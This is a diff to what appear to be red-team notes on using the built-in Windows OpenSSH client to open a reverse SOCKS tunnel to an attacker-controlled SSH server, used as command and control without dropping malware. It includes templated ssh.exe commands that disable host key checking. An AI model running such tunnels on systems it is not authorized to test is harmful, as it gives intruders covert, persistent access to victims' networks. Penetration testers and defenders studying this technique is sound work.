@@ -2,15 +2,17 @@
 
 Search Tag(s): #initial-access #living-off-the-foreign-land #living-off-the-land
 
+## SSH
+
 Refer to this [[04 - Remote Port Forwarding|section]] for remote port forwarding to configure the user without any requirement for authentication.
 
-### Reverse SOCKS Proxy
+### Reverse Tunneling SOCKS Proxy
 
 Instead of dropping malware instead we'll use `proxychains` or `privoxy` with the SSH server (the attacker's server) as the command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware implant.
 
 ```
-C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR <SOCKS_proxy> -o "StrictHostKeyChecking=no"
-%SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR <SOCKS_proxy> -o "StrictHostKeyChecking=no"
+C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR [127.0.0.1:]<SOCKS_proxy> -o "StrictHostKeyChecking=no"
+%SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR [127.0.0.1:]<SOCKS_proxy> -o "StrictHostKeyChecking=no"
 ```
 
 In the SSH server we should see a listening port of the SOCKS Proxy.
